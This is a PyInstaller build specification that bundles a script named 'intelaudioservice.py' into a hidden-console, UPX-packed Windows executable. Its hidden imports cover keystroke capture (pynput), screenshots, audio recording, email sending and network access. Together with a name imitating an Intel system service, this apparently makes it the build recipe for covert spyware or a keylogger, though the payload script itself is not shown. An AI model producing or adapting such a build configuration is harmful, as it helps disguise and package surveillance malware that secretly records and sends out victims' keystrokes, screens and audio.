# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['intelaudioservice.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['logging', 'os', 'platform', 'smtplib', 'socket', 'threading', 'wave', 'pyscreenshot', 'sounddevice', 'glob', 'pynput', 'email', 'subprocess', 'requests', 'json', 'time', 'datetime', 'sys', 'shutil', 'ctypes', 'ctypes.wintypes', 'ctypes.util', 'ctypes.util.find_library', 'ctypes.util._get_build_version'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='intelaudioservice',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['icon.ico'],
)
